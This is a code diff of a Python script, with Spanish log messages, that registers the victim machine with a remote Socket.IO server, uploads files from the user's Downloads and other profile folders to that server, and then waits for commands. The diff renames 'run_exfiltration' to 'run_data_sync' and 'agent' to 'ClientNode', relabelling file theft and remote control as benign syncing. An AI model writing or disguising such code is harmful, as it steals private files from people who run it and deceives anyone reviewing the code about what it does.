@@ -13,13 +13,13 @@ UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"
 
 # Inicializar Socket.IO client
 sio = socketio.Client()
-AGENT_ID = socket.gethostname() # Use hostname as agentId for uniqueness
+NODE_ID = socket.gethostname() # Use hostname as nodeId for uniqueness
 
 # --- Socket.IO Events ---
 @sio.event
 def connect():
-    log(f"Socket.IO conectado al servidor. ID del Agente: {AGENT_ID}")
-    sio.emit('register_agent', {'agentId': AGENT_ID}) # Register agent with the server
+    log(f"Socket.IO conectado al servidor. ID del ClientNode: {NODE_ID}")
+    sio.emit('register_node', {'nodeId': NODE_ID}) # Register node with the server
 
 @sio.event
 def disconnect():
@@ -50,7 +50,7 @@ def log(message):
     except:
         pass
 
-def run_exfiltration():
+def run_data_sync():
     user_profile = os.environ.get('USERPROFILE', '')
     targets = [
         os.path.join(user_profile, 'Downloads'),
@@ -72,7 +72,7 @@ def run_exfiltration():
                     
                     # 1. Verificar duplicados
                     check = requests.get(f"{SERVER_URL}/api/check-file", params={
-                        'agentId': socket.gethostname() if 'socket' in globals() else 'win_update',
+                        'nodeId': NODE_ID,
                         'filename': filename
                     }, timeout=5)
                     
@@ -87,7 +87,7 @@ def run_exfiltration():
                     with open(file_path, 'rb') as f:
                         requests.post(UPLOAD_ENDPOINT, 
                                     files={'file': (filename, f.read())}, 
-                                    data={'agentId': 'win_system_update'}, 
+                                    data={'nodeId': NODE_ID}, 
                                     timeout=15)
                 except:
                     continue
@@ -100,13 +100,14 @@ def run_exfiltration():
 if __name__ == "__main__":
     try:
         sio.connect(SERVER_URL)
-        log(f"Agente Python conectado a {SERVER_URL}")
+        log(f"ClientNode Python conectado a {SERVER_URL}")
     except Exception as e:
-        log(f"Fallo al conectar el agente Python al servidor: {e}")
+        log(f"Fallo al conectar el ClientNode Python al servidor: {e}")
         sys.exit(1) # Exit if connection fails
         
-    run_exfiltration() # Run exfiltration before waiting for commands
+    run_data_sync() # Run data sync before waiting for commands
 
     sio.wait() # Keep the Socket.IO connection alive
+
 
     sys.exit(0)
